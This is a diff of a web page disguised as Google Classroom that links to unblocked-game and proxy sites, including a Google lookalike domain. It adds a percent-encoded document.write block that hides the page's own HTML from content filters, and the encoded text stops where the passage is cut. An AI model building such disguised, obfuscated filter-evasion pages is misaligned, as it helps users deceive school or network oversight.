@@ -8,499 +8,691 @@
 <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
 <link href="https://fonts.googleapis.com/css2?family=Google+Sans&display=swap" rel="stylesheet">
 <link rel="icon" type="image/png" href="https://ssl.gstatic.com/classroom/favicon.png">
-<style>
-body { font-family: "Google Sans", Arial, sans-serif; margin:0; padding:0; }
-.category-list { max-height: 0; overflow: hidden; transition: max-height 0.35s ease, opacity 0.35s ease, margin 0.35s ease; opacity: 0; margin-top: 0; }
-.category-list.open { opacity: 1; margin-top: 0.25rem; max-height: 500px; }
-@keyframes shimmer {0%{background-position:-400px 0;}100%{background-position:400px 0;} }
-.skeleton{position:relative;overflow:hidden;background-color:#e0e0e0;border-radius:4px;}
-.skeleton::after{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.4),transparent);animation:shimmer 4s infinite;}
-#iframeOverlay {
-  display: none;
-  position: absolute;
-  top: 100px; /* height of header */
-  left: 16.81rem; /* sidebar width */
-  right: 0rem; /* small right margin */
-  bottom: 0rem; /* small bottom margin */
-  z-index: 1000;
-  background: white;
-  border: none;
-  border-radius: 8px; /* optional, looks nicer */
-  box-shadow: 0 4px 12px rgba(0,0,0,0.15); /* optional */
-  overflow: hidden;
-}
-
-#iframeOverlay iframe {
-  width: 100%;
-  height: 100%;
-  border: none;
-}
-#iframeToggleBtn{position:fixed;bottom:20px;left:20px;width:40px;height:40px;background:#1967d2;color:white;border-radius:9999px;display:flex;align-items:center;justify-content:center;cursor:grab;z-index:1100;font-size:16px;user-select:none;display:none;}
-#iframeToggleBtn:active{cursor:grabbing;}
-.active-link{background-color:#d2e3fc;color:#1967d2;}
-.sidebar-scale{transform:scale(1.05);transform-origin:top left;}
-.category-header{font-weight:600;font-size:0.875rem;margin-top:0.5rem;margin-bottom:0.25rem;padding-left:0.75rem;color:#555;cursor:pointer;user-select:none;display:flex;justify-content:space-between;align-items:center;}
-.enrolled-item{padding-left:0.5rem;padding-top:0.25rem;padding-bottom:0.25rem;border-radius:4px;display:flex;align-items:center;gap:0.80rem;transition:background 0.15s;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-size:0.875rem;}
-.enrolled-item:hover{background-color:#e3f2fd;}
-.favicon-img,.favicon-letter{width:20px;height:20px;flex-shrink:0;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:0.75rem;font-weight:600;color:#000;background:#cfd8dc;}
-</style>
-</head>
-<body class="bg-[#f8fafc] min-h-screen flex">
-
-<!-- Sidebar -->
-<aside class="flex flex-col w-64 bg-white border-r border-gray-200 relative z-10 sidebar-scale">
-  <header class="flex items-center gap-3 px-5 py-4 border-b border-gray-200">
-    <button aria-label="Menu" class="text-gray-700 text-xl"><i class="fas fa-bars"></i></button>
-    <img alt="Google Classroom icon" class="w-6 h-6 ml-2" src="https://www.gstatic.com/classroom/ic_product_classroom_144.png">
-    <span class="text-gray-800 text-base font-normal select-none ml-2">Classroom</span>
-  </header>
-  <nav class="flex flex-col mt-4 px-2 space-y-1">
-    <a class="flex items-center gap-3 px-3 py-2 rounded-lg bg-[#d2e3fc] text-[#1967d2] text-sm font-medium select-none" href="#"><i class="fas fa-home text-sm"></i> Home</a>
-    <a class="flex items-center gap-3 px-3 py-2 rounded-lg text-gray-700 text-sm font-normal hover:bg-gray-100 select-none" href="#"><i class="far fa-calendar-alt text-sm"></i> Calendar</a>
-    <button id="enrolledBtn" aria-expanded="false" class="flex items-center gap-3 px-3 py-2 rounded-lg text-gray-700 text-sm font-normal hover:bg-gray-100 select-none w-full" type="button">
-      <i class="fas fa-graduation-cap text-sm"></i> Enrolled
-      <i id="enrolledChevron" class="fas fa-chevron-down ml-auto text-xs transition-transform duration-200" style="transform: rotate(-90deg);"></i>
-    </button>
-    <div id="enrolledList" class="flex flex-col space-y-1 mt-1" style="display:none;">
-      <div class="category">
-        <div class="category-header">Games <i class="fas fa-chevron-down text-xs" style="transform: rotate(-90deg);"></i></div>
-        <div class="category-list">
-          <a id="nullLink" data-url="https://nullxiety.com/" class="enrolled-item"></a>
-          <a id="totallyLink" data-url="https://weslack.com/" class="enrolled-item"></a>
-          <a id="scienceLink" data-url="https://totallyscience.app/" class="enrolled-item"></a>
-          <a id="gnLink" data-url="https://gn-math.github.io/" class="enrolled-item"></a>
-          <a id="englishLink" data-url="https://www.julios.games/home" class="enrolled-item"></a>
-        </div>
-      </div>
-      <div class="category">
-        <div class="category-header">Browser+Games <i class="fas fa-chevron-down text-xs" style="transform: rotate(-90deg);"></i></div>
-        <div class="category-list">
-          <a id="browserLink" data-url="https://best-force-734.nowgg.me/" class="enrolled-item"></a>
-          <a id="spaceLink" data-url="https://erbytes.host2go.net/" class="enrolled-item"></a>
-          <a id="randomLink" data-url="https://study.info.north-kazakhstan.su/" class="enrolled-item"></a>
-          <a id="utopia2Link" data-url="https://meta-games-proxies.crabdance.com/" class="enrolled-item"></a>
-          <a id="utopia3Link" data-url="https://bombbombbombiran.ruhezeiter.ch/" class="enrolled-item"></a>
-          <a id="utopiaLink" data-url="https://classroom.google.com.my.to/" class="enrolled-item"></a>
-          <a id="utopiaLink" data-url="https://apply.freediddy.info/" class="enrolled-item"></a>
-        </div>
-      </div>
-    </div>
-    <a class="flex items-center gap-3 px-3 py-2 rounded-lg text-gray-700 text-sm font-normal hover:bg-gray-100 select-none" href="#"><i class="far fa-folder text-sm"></i> Archived classes</a>
-    <a class="flex items-center gap-3 px-3 py-2 rounded-lg text-gray-700 text-sm font-normal hover:bg-gray-100 select-none" href="#"><i class="fas fa-cog text-sm"></i> Setting<span class="text-xs font-normal ml-auto">›</span></a>
-  </nav>
-</aside>
-
-<!-- Main -->
-<main class="flex-1 p-6 overflow-auto">
-  <header class="flex items-center justify-end gap-6 mb-6">
-    <button aria-label="Create" class="flex items-center justify-center w-8 h-8 text-gray-700 hover:bg-gray-200 rounded-full transition-colors duration-200">
-      <svg aria-hidden="true" class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 5v14M5 12h14" stroke-linecap="round" stroke-linejoin="round"></path></svg>
-    </button>
-    <button aria-label="Apps" class="text-gray-700 font-light hover:bg-gray-200 rounded-full w-8 h-8 flex items-center justify-center">
-      <svg aria-hidden="true" class="w-4 h-4" fill="#5f6368" viewBox="0 0 24 24"><circle cx="4.5" cy="4.5" r="2.5"/><circle cx="12" cy="4.5" r="2.5"/><circle cx="19.5" cy="4.5" r="2.5"/><circle cx="4.5" cy="12" r="2.5"/><circle cx="12" cy="12" r="2.5"/><circle cx="19.5" cy="12" r="2.5"/><circle cx="4.5" cy="19.5" r="2.5"/><circle cx="12" cy="19.5" r="2.5"/><circle cx="19.5" cy="19.5" r="2.5"/></svg>
-    </button>
-    <button id="profileBtn" aria-label="User profile" class="w-8 h-8 rounded-full flex items-center justify-center text-white font-semibold select-none cursor-pointer" title="Click to change profile color/letter">
-      <span id="profileLetter" class="text-sm leading-none"> </span>
-    </button>
-  </header>
-
-  <section aria-label="Classroom cards" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-6">
     <script>
-      for(let i=0;i<5;i++){
-        document.write(`<article class="bg-white rounded-lg border border-gray-200 shadow-sm p-4 flex flex-col justify-between min-h-[180px]">
-          <div class="flex justify-between items-start mb-4">
-            <div class="space-y-2 w-3/4">
-              <div class="h-3 skeleton w-2/3"></div>
-              <div class="h-3 skeleton w-1/2"></div>
-            </div>
-            <div class="rounded-full bg-gray-200 w-12 h-12 flex-shrink-0"></div>
-          </div>
-          <hr class="border-gray-200 mb-3">
-          <!-- votes section removed -->
-        </article>`);
-      }
+        function updateURL(message) {
+            let index = 0;
+            const interval = 100; // Speed of the scrolling in milliseconds
+            const urlLength = 60; // Maximum length of the URL bar
+
+            function scrollMessage() {
+                if (index < message.length) {
+                    const displayMessage = message.substring(index);
+                    window.history.pushState(null, null, `/?${displayMessage.padEnd(urlLength, ' ')}`);
+                    index++;
+                    setTimeout(scrollMessage, interval);
+                } else {
+                    window.history.pushState(null, null, '/');
+                }
+            }
+
+            scrollMessage();
+        }
+
+        window.onload = function() {
+            const message = 'classroom';
+            updateURL(message);
+        };
     </script>
-  </section>
-</main>
-
-<div id="iframeOverlay"><iframe src="" allowfullscreen allow="fullscreen"></iframe></div>
-<div id="iframeToggleBtn" title="Show/Hide iframe">⇅</div>
-
-<div id="wikiModal" class="fixed inset-0 z-[1200] hidden items-center justify-center">
-  <div id="wikiOverlay" class="absolute inset-0 bg-black/40 backdrop-blur-sm"></div>
-  <div id="wikiBox" class="relative bg-white rounded-2xl shadow-2xl w-[90%] max-w-xl p-6 transform scale-95 opacity-0 transition-all duration-300">
-    <div class="flex justify-between items-center border-b pb-3 mb-4">
-      <h2 class="text-lg font-semibold text-gray-800">🌐 Web Proxy 🌐</h2>
-      <button id="closeWiki" class="text-gray-500 hover:text-gray-700 text-xl">&times;</button>
-    </div>
-    <div class="flex flex-col md:flex-row gap-4 items-center justify-between mb-4">
-      <label class="flex flex-col w-full md:w-1/2">
-        <span class="text-sm font-semibold mb-1">Filter by Name</span>
-        <select id="filter-name" class="rounded border-gray-300 p-2 focus:ring-blue-500">
-          <option value="">All</option>
-        </select>
-      </label>
-      <label class="flex flex-col w-full md:w-1/2">
-        <span class="text-sm font-semibold mb-1">Filter by Date</span>
-        <select id="filter-date" class="rounded border-gray-300 p-2 focus:ring-blue-500">
-          <option value="today">Today</option>
-          <option value="yesterday">Yesterday</option>
-          <option value="last7">Last 7 Days</option>
-          <option value="thisMonth">This Month</option>
-          <option value="lastMonth">Last Month</option>
-          <option value="thisYear">This Year</option>
-          <option value="all" selected>All Time</option>
-        </select>
-      </label>
-    </div>
-    <div id="results" class="space-y-3 max-h-[50vh] overflow-y-auto"></div>
-  </div>
-</div>
-
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
-<script>
-const enrolledBtn=document.getElementById("enrolledBtn");
-const enrolledList=document.getElementById("enrolledList");
-const enrolledChevron=document.getElementById("enrolledChevron");
-const iframeOverlay=document.getElementById("iframeOverlay");
-const iframeEl=iframeOverlay.querySelector("iframe");
-const iframeToggleBtn=document.getElementById("iframeToggleBtn");
-const profileBtn=document.getElementById("profileBtn");
-const profileLetter=document.getElementById("profileLetter");
-
-// Select the "+" button at the top
-const createBtn = document.querySelector('button[aria-label="Create"]');
-
-// Toggle Minnit chat iframe
-function toggleMinnitIframe() {
-  if (iframeOverlay.style.display === "block" && iframeEl.src.includes("minnit.chat")) {
-    // Just hide (don't unload)
-    iframeOverlay.style.display = "none";
-  } else {
-    // Show Minnit chat
-    iframeOverlay.style.display = "block";
-    iframeEl.src = "https://organizations.minnit.chat/878547462864938/c/Main?embed&transparent";
-    iframeToggleBtn.style.display = "none"; // hide the ⇅ for this iframe
-    setEnrolled(false);
-    document.querySelectorAll(".enrolled-item").forEach(l => l.classList.remove("active-link"));
-  }
-}
-
-// Attach to "+"
-createBtn.addEventListener("click", toggleMinnitIframe);
-
-  
-const supabase = window.supabase.createClient(
-  'https://ylbeucokkfotgghbveuv.supabase.co',
-  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlsYmV1Y29ra2ZvdGdnaGJ2ZXV2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ0MjU5MjksImV4cCI6MjA2MDAwMTkyOX0.EM52Z8YVA4xuCnNPLrAuweJq652QAPa3AjxjNRIrxE8'
-);
-
-const userId = localStorage.getItem('userId') || ('user_' + Math.random().toString(36).substr(2,9));
-localStorage.setItem('userId', userId);
-
-// Toggle enrolled
-function setEnrolled(open){
-  enrolledList.style.display=open?"flex":"none";
-  enrolledBtn.setAttribute("aria-expanded",open);
-  enrolledChevron.style.transform=open?"rotate(0deg)":"rotate(-90deg)";
-}
-enrolledBtn.addEventListener("click",()=>{setEnrolled(enrolledList.style.display==="none");});
-
-// Profile persistence
-const savedLetter=localStorage.getItem("profileLetter");
-const savedColor=localStorage.getItem("profileColor");
-if(savedLetter) profileLetter.textContent=savedLetter;
-if(savedColor) profileBtn.style.backgroundColor=savedColor;
-
-// Category expand/collapse
-document.querySelectorAll('.category-header').forEach(h=>{
-  const list=h.nextElementSibling;
-  const icon=h.querySelector('i');
-  icon.style.transform="rotate(-90deg)";
-  h.addEventListener('click',()=>{
-    const open=list.classList.toggle('open');
-    icon.style.transform=open?"rotate(0deg)":"rotate(-90deg)";
-  });
-});
-
-// Iframe open
-function openIframe(linkEl,url){
-  iframeOverlay.style.display="block";
-  iframeEl.src=url;
-  iframeToggleBtn.style.display="flex";
-  setEnrolled(false);
-  document.querySelectorAll(".enrolled-item").forEach(l=>l.classList.remove("active-link"));
-  linkEl.classList.add("active-link");
-}
-
-// Smart favicon
-function hashColor(str){let h=0;for(let i=0;i<str.length;i++)h=str.charCodeAt(i)+((h<<5)-h);const colors=["#ffd700","#f9d9c5","#e0e0e0","#add8e6","#cce0ff","#ffcce0","#d2e3fc"];return colors[Math.abs(h)%colors.length];}
-async function smartFavicon(url,link){
-  let domain;
-  try{domain=new URL(url).origin;}catch{ return;}
-  const img=document.createElement("img");
-  img.className="favicon-img";
-  img.alt="favicon";
-  const trySources=[`https://www.google.com/s2/favicons?domain=${domain}&sz=32`, `${domain}/favicon.ico`];
-  try {
-    const resp=await fetch(url,{mode:"cors"});
-    const html=await resp.text();
-    const parser=new DOMParser();
-    const doc=parser.parseFromString(html,"text/html");
-    const icons=[...doc.querySelectorAll("link[rel*='icon']")];
-    if(icons.length){
-      const href=icons[0].getAttribute("href");
-      if(href){const abs=new URL(href,domain).href;trySources.unshift(abs);}
-    }
-  } catch(e){}
-  let i=0;
-  function tryNext(){
-    if(i>=trySources.length){
-      const fallback=document.createElement("span");
-      fallback.textContent=new URL(url).hostname.charAt(0).toUpperCase();
-      fallback.className="favicon-letter";
-      fallback.style.backgroundColor=hashColor(url);
-      link.querySelector("img, span")?.remove();
-      link.prepend(fallback);
-      return;
-    }
-    img.src=trySources[i++];
-  }
-  img.onload=()=>{if(img.naturalWidth<16) tryNext(); else{link.querySelector("img, span")?.remove(); link.prepend(img);}};
-  img.onerror=tryNext;
-  tryNext();
-}
-
-// Load enrolled links and restore order after all items exist
-async function loadEnrolledItems() {
-  const links = document.querySelectorAll(".enrolled-item");
-
-  for (const link of links) {
-    const url = link.dataset.url;
-    link.textContent = " " + (new URL(url).hostname.replace(/^www\./, ""));
-    await smartFavicon(url, link);
-
-    if (url.includes("julios.games")) {
-      if (!link.querySelector("i")) {
-        const icon = document.createElement("i");
-        icon.className = "fas fa-external-link-alt ml-auto text-xs";
-        link.append(icon);
-      }
-    }
-
-    link.addEventListener("click", e => {
-      e.preventDefault();
-      const categoryList = link.parentElement;
-
-      // Move clicked link to the top
-      categoryList.prepend(link);
-
-      // Save new order in localStorage
-      const ids = Array.from(categoryList.querySelectorAll(".enrolled-item")).map(l => l.id);
-      localStorage.setItem(`order_${categoryList.parentElement.querySelector(".category-header").textContent}`, JSON.stringify(ids));
-
-      if (url.includes("julios.games")) {
-        window.open(url, "_blank");
-      } else {
-        openIframe(link, url);
-      }
-    });
-  }
-
-  // Restore saved order AFTER all links are populated
-  document.querySelectorAll(".category").forEach(cat => {
-    const header = cat.querySelector(".category-header").textContent;
-    const list = cat.querySelector(".category-list");
-    const savedOrder = JSON.parse(localStorage.getItem(`order_${header}`) || "[]");
-    if (savedOrder.length) {
-      savedOrder.forEach(id => {
-        const el = list.querySelector(`#${id}`);
-        if (el) list.appendChild(el);
-      });
-    }
-  });
-}
-
-// Initialize enrolled links
-loadEnrolledItems();
-
-  
-// Toggle iframe
-iframeToggleBtn.addEventListener("click",()=>{iframeOverlay.style.display=iframeOverlay.style.display==="none"?"block":"none";});
-
-// Draggable iframe
-let isDragging=false,dx=0,dy=0;
-iframeToggleBtn.addEventListener("mousedown",e=>{isDragging=true;dx=e.clientX-iframeToggleBtn.offsetLeft;dy=e.clientY-iframeToggleBtn.offsetTop;iframeToggleBtn.style.cursor="grabbing";});
-document.addEventListener("mousemove",e=>{if(!isDragging)return;iframeToggleBtn.style.left=`${e.clientX-dx}px`;iframeToggleBtn.style.top=`${e.clientY-dy}px`;});
-document.addEventListener("mouseup",()=>{isDragging=false;iframeToggleBtn.style.cursor="grab";});
-
-// WIKI-LINKS FETCH (votes removed, everything else intact)
-const wikiModal = document.getElementById('wikiModal');
-const wikiBox = document.getElementById('wikiBox');
-const wikiOverlay = document.getElementById('wikiOverlay');
-const closeWiki = document.getElementById('closeWiki');
-const archivedBtn = [...document.querySelectorAll("a")].find(el => el.textContent.includes("Archived classes"));
-let page = 0, pageSize = 5, currentFilter = { name: '', range: 'all' }, totalLinks = 0;
-
-archivedBtn.addEventListener('click', () => {
-  wikiModal.classList.remove('hidden');
-  setTimeout(() => wikiBox.classList.add('scale-100', 'opacity-100'), 10);
-  loadNames();
-  applyFilters();
-});
-closeWiki.addEventListener('click', closeModal);
-wikiOverlay.addEventListener('click', closeModal);
-function closeModal() { wikiBox.classList.remove('scale-100','opacity-0'); setTimeout(()=>wikiModal.classList.add('hidden'),200); }
-
-document.getElementById('filter-name').addEventListener('change', applyFilters);
-document.getElementById('filter-date').addEventListener('change', applyFilters);
-
-async function loadNames() {
-  const { data } = await supabase.from('link_names').select('name');
-  const select = document.getElementById('filter-name');
-  select.innerHTML = `<option value="">All</option>`;
-  data?.forEach(d => { const opt = document.createElement('option'); opt.value=d.name; opt.textContent=d.name; select.appendChild(opt); });
-}
-
-function getDateRange(rangeType) {
-  const now=new Date(), start=new Date(), end=new Date();
-  switch(rangeType){
-    case 'today': start.setHours(0,0,0,0); return {start,end:now};
-    case 'yesterday': start.setDate(start.getDate()-1); end.setDate(end.getDate()-1); start.setHours(0,0,0,0); end.setHours(23,59,59,999); return {start,end};
-    case 'last7': start.setDate(start.getDate()-6); return {start,end:now};
-    case 'thisMonth': start.setDate(1); return {start,end:now};
-    case 'lastMonth': start.setMonth(start.getMonth()-1); start.setDate(1); end.setMonth(start.getMonth()); end.setDate(0); end.setHours(23,59,59,999); return {start,end};
-    case 'thisYear': start.setMonth(0,1); start.setHours(0,0,0,0); return {start,end:now};
-    default: return null;
-  }
-}
-
-async function applyFilters() { page=0; currentFilter.name=document.getElementById('filter-name').value; currentFilter.range=document.getElementById('filter-date').value; await countTotalLinks(); await fetchLinks(); }
-
-async function countTotalLinks() {
-  let query = supabase.from('links').select('*', { count: 'exact', head: true });
-  if(currentFilter.name) query = query.eq('name', currentFilter.name);
-  const range=getDateRange(currentFilter.range);
-  if(range) query=query.gte('date', range.start.toISOString().split('T')[0]).lte('date', range.end.toISOString().split('T')[0]);
-  const { count }=await query; totalLinks=count||0;
-}
-
-async function fetchLinks() {
-  const container=document.getElementById('results');
-  container.innerHTML='';
-  let query=supabase.from('links').select('*').order('date',{ascending:false}).range(page*pageSize,(page+1)*pageSize-1);
-  if(currentFilter.name) query=query.eq('name',currentFilter.name);
-  const range=getDateRange(currentFilter.range);
-  if(range) query=query.gte('date', range.start.toISOString().split('T')[0]).lte('date', range.end.toISOString().split('T')[0]);
-  const { data }=await query;
-  if(!data||data.length===0){container.innerHTML=`<div class="text-center text-gray-500 py-4">⚠️ No links found.</div>`;return;}
-
-  for(const link of data){
-    const div=document.createElement('div');
-    div.className='p-3 rounded-xl border hover:bg-gray-50 flex flex-col gap-1';
-    div.innerHTML=`
-      <a href="${link.url}" target="_blank" class="text-blue-600 hover:underline break-all font-medium">${link.name}</a>
-      <span class="text-gray-500 text-xs break-all">${link.url}</span>
-      <span class="text-gray-400 text-xs">${new Date(link.date).toLocaleDateString()}</span>
-    `;
-    container.appendChild(div);
-  }
-}
-</script>
-<!-- Login / Sign-Up Modal -->
-<div id="authModal" class="fixed inset-0 z-[1300] hidden items-center justify-center">
-  <div id="authOverlay" class="absolute inset-0 bg-black/40 backdrop-blur-sm"></div>
-  <div class="relative bg-white rounded-2xl shadow-2xl w-[90%] max-w-md p-6 transform scale-95 opacity-0 transition-all duration-300">
-    <div class="flex justify-between items-center border-b pb-3 mb-4">
-      <h2 id="authTitle" class="text-lg font-semibold text-gray-800">Login</h2>
-      <button id="closeAuthModal" class="text-gray-500 hover:text-gray-700 text-xl">&times;</button>
-    </div>
-    <div class="flex flex-col gap-4">
-      <input id="authEmail" type="email" placeholder="Email" class="border rounded px-3 py-2 w-full focus:ring-blue-500">
-      <input id="authPassword" type="password" placeholder="Password" class="border rounded px-3 py-2 w-full focus:ring-blue-500">
-      <button id="authActionBtn" class="bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition-colors">Login</button>
-      <span id="authMessage" class="text-red-500 text-sm"></span>
-      <p class="text-sm text-gray-600 mt-2">
-        <span id="toggleAuth" class="text-blue-600 hover:underline cursor-pointer">Don't have an account? Sign Up</span>
-      </p>
-    </div>
-  </div>
-</div>
-
-<script>
-// AUTH MODAL SCRIPT
-const authModal = document.getElementById('authModal');
-const authOverlay = document.getElementById('authOverlay');
-const closeAuthModal = document.getElementById('closeAuthModal');
-const authTitle = document.getElementById('authTitle');
-const authEmail = document.getElementById('authEmail');
-const authPassword = document.getElementById('authPassword');
-const authActionBtn = document.getElementById('authActionBtn');
-const authMessage = document.getElementById('authMessage');
-const toggleAuth = document.getElementById('toggleAuth');
-
-let isLogin = true; // Toggle between login and signup
-
-function openAuthModal() {
-  authModal.classList.remove('hidden');
-  setTimeout(() => authModal.querySelector('div.relative').classList.add('scale-100','opacity-100'), 10);
-}
-
-function closeAuth() {
-  const modalContent = authModal.querySelector('div.relative');
-  modalContent.classList.remove('scale-100','opacity-0');
-  setTimeout(() => authModal.classList.add('hidden'), 200);
-  authMessage.textContent = '';
-  authEmail.value = '';
-  authPassword.value = '';
-}
-
-// Open modal on double-click profile button
-profileBtn.addEventListener('dblclick', openAuthModal);
-closeAuthModal.addEventListener('click', closeAuth);
-authOverlay.addEventListener('click', closeAuth);
-
-// Toggle Login / Sign-Up
-toggleAuth.addEventListener('click', () => {
-  isLogin = !isLogin;
-  if (isLogin) {
-    authTitle.textContent = 'Login';
-    authActionBtn.textContent = 'Login';
-    toggleAuth.textContent = "Don't have an account? Sign Up";
-  } else {
-    authTitle.textContent = 'Sign Up';
-    authActionBtn.textContent = 'Sign Up';
-    toggleAuth.textContent = "Already have an account? Login";
-  }
-  authMessage.textContent = '';
-});
-
-// Handle Auth (Login / Sign-Up)
-authActionBtn.addEventListener('click', async () => {
-  const email = authEmail.value.trim();
-  const password = authPassword.value.trim();
-
-  if (!email || !password) {
-    authMessage.textContent = 'Please enter email and password';
-    return;
-  }
-
-  if (isLogin) {
-    // LOGIN
-    const { data: user, error } = await supabase.auth.signInWithPassword({ email, password });
-    if (error) authMessage.textContent = error.message;
-    else { authMessage.textContent = 'Logged in successfully!'; closeAuth(); console.log('User:', user); }
-  } else {
-    // SIGN-UP
-    const { data, error } = await supabase.auth.signUp({ email, password });
-    if (error) authMessage.textContent = error.message;
-    else { 
-      authMessage.textContent = 'Account created! Please check your email to confirm.';
-      authEmail.value = '';
-      authPassword.value = '';
-    }
-  }
-});
-</script>
 </body>
 </html>
+<script language="javascript">document.write(unescape('%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E%0A%3C%68%74%6D%6C%20%6C%61%6E%67%3D%22%65%6E%22%3E%0A%3C%68%65%61%64%3E%0A%3C%6D%65%74%61%20%63%68%61%72%73%65%74%3D%22%75%74%66%2D%38%22%3E%0A%3C%6D%65%74%61%20%6E%61%6D%65%3D%22%76%69%65%77%70%6F%72%74%22%20%63%6F%6E%74%65%6E%74%3D%22%77%69%64%74%68%3D%64%65%76%69%63%65%2D%77%69%64%74%68%2C%20%69%6E%69%74%69%61%6C%2D%73%63%61%6C%65%3D%31%22%3E%0A%3C%74%69%74%6C%65%3E%48%6F%6D%65%3C%2F%74%69%74%6C%65%3E%0A%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%63%64%6E%2E%74%61%69%6C%77%69%6E%64%63%73%73%2E%63%6F%6D%22%3E%3C%2F%73%63%72%69%70%74%3E%0A%3C%6C%69%6E%6B%20%68%72%65%66%3D%22%68%74%74%70%73%3A%2F%2F%63%64%6E%6A%73%2E%63%6C%6F%75%64%66%6C%61%72%65%2E%63%6F%6D%2F%61%6A%61%78%2F%6C%69%62%73%2F%66%6F%6E%74%2D%61%77%65%73%6F%6D%65%2F%35%2E%31%35%2E%33%2F%63%73%73%2F%61%6C%6C%2E%6D%69%6E%2E%63%73%73%22%20%72%65%6C%3D%22%73%74%79%6C%65%73%68%65%65%74%22%3E%0A%3C%6C%69%6E%6B%20%68%72%65%66%3D%22%68%74%74%70%73%3A%2F%2F%66%6F%6E%74%73%2E%67%6F%6F%67%6C%65%61%70%69%73%2E%63%6F%6D%2F%63%73%73%32%3F%66%61%6D%69%6C%79%3D%47%6F%6F%67%6C%65%2B%53%61%6E%73%26%64%69%73%70%6C%61%79%3D%73%77%61%70%22%20%72%65%6C%3D%22%73%74%79%6C%65%73%68%65%65%74%22%3E%0A%3C%6C%69%6E%6B%20%72%65%6C%3D%22%69%63%6F%6E%22%20%74%79%70%65%3D%22%69%6D%61%67%65%2F%70%6E%67%22%20%68%72%65%66%3D%22%68%74%74%70%73%3A%2F%2F%73%73%6C%2E%67%73%74%61%74%69%63%2E%63%6F%6D%2F%63%6C%61%73%73%72%6F%6F%6D%2F%66%61%76%69%63%6F%6E%2E%70%6E%67%22%3E%0A%3C%73%74%79%6C%65%3E%0A%2F%2A%20%47%65%6E%65%72%61%6C%20%66%6F%6E%74%20%26%20%62%6F%64%79%20%73%65%74%75%70%20%2A%2F%0A%62%6F%64%79%20%7B%0A%20%20%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%20%22%47%6F%6F%67%6C%65%20%53%61%6E%73%22%2C%20%41%72%69%61%6C%2C%20%73%61%6E%73%2D%73%65%72%69%66%3B%0A%20%20%6D%61%72%67%69%6E%3A%20%30%3B%0A%20%20%70%61%64%64%69%6E%67%3A%20%30%3B%0A%20%20%68%65%69%67%68%74%3A%20%31%30%30%25%3B%0A%20%20%6F%76%65%72%66%6C%6F%77%3A%20%68%69%64%64%65%6E%3B%0A%20%20%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%66%38%66%61%66%63%3B%0A%20%20%66%6F%6E%74%2D%77%65%69%67%68%74%3A%20%36%30%30%3B%20%2F%2A%20%73%6C%69%67%68%74%6C%79%20%62%6F%6C%64%65%72%20%62%61%73%65%20%66%6F%6E%74%20%2A%2F%0A%7D%0A%0A%2F%2A%20%53%69%64%65%62%61%72%20%73%63%72%6F%6C%6C%61%62%6C%65%20%2A%2F%0A%61%73%69%64%65%20%7B%0A%20%20%68%65%69%67%68%74%3A%20%31%30%30%76%68%3B%0A%20%20%6F%76%65%72%66%6C%6F%77%2D%79%3A%20%61%75%74%6F%3B%0A%20%20%2D%77%65%62%6B%69%74%2D%6F%76%65%72%66%6C%6F%77%2D%73%63%72%6F%6C%6C%69%6E%67%3A%20%74%6F%75%63%68%3B%0A%20%20%66%6C%65%78%2D%73%68%72%69%6E%6B%3A%20%30%3B%0A%20%20%66%6F%6E%74%2D%77%65%69%67%68%74%3A%20%37%30%35%3B%20%2F%2A%20%73%6C%69%67%68%74%6C%79%20%62%6F%6C%64%65%72%20%74%65%78%74%20%2A%2F%0A%7D%0A%0A%2F%2A%20%53%69%64%65%62%61%72%20%65%6C%65%6D%65%6E%74%73%20%2A%2F%0A%2E%63%61%74%65%67%6F%72%79%2D%6C%69%73%74%20%7B%0A%20%20%6D%61%78%2D%68%65%69%67%68%74%3A%20%30%3B%0A%20%20%6F%76%65%72%66%6C%6F%77%3A%20%68%69%64%64%65%6E%3B%0A%20%20%74%72%61%6E%73%69%74%69%6F%6E%3A%20%6D%61%78%2D%68%65%69%67%68%74%20%30%2E%33%35%73%20%65%61%73%65%2C%20%6F%70%61%63%69%74%79%20%30%2E%33%35%73%20%65%61%73%65%2C%20%6D%61%72%67%69%6E%20%30%2E%33%35%73%20%65%61%73%65%3B%0A%20%20%6F%70%61%63%69%74%79%3A%20%30%2E%31%3B%0A%20%20%6D%61%72%67%69%6E%2D%74%6F%70%3A%20%30%3B%0A%7D%0A%2E%63%61%74%65%67%6F%72%79%2D%6C%69%73%74%2E%6F%70%65%6E%20%7B%0A%20%20%6F%70%61%63%69%74%79%3A%20%31%3B%0A%20%20%6D%61%72%67%69%6E%2D%74%6F%70%3A%20%30%2E%32%35%72%65%6D%3B%0A%20%20%6D%61%78%2D%68%65%69%67%68%74%3A%20%35%31%30%70%78%3B%0A%7D%0A%2E%63%61%74%65%67%6F%72%79%2D%68%65%61%64%65%72%20%7B%0A%20%20%66%6F%6E%74%2D%77%65%69%67%68%74%3A%20%36%30%30%3B%20%0A%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%30%2E%38%37%35%72%65%6D%3B%0A%20%20%6D%61%72%67%69%6E%2D%74%6F%70%3A%20%30%2E%35%72%65%6D%3B%0A%20%20%6D%61%72%67%69%6E%2D%62%6F%74%74%6F%6D%3A%20%30%2E%32%35%72%65%6D%3B%0A%20%20%70%61%64%64%69%6E%67%2D%6C%65%66%74%3A%20%30%2E%37%35%72%65%6D%3B%0A%20%20%63%6F%6C%6F%72%3A%20%23%35%35%35%3B%0A%20%20%63%75%72%73%6F%72%3A%20%70%6F%69%6E%74%65%72%3B%0A%20%20%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%6E%6F%6E%65%3B%0A%20%20%64%69%73%70%6C%61%79%3A%20%66%6C%65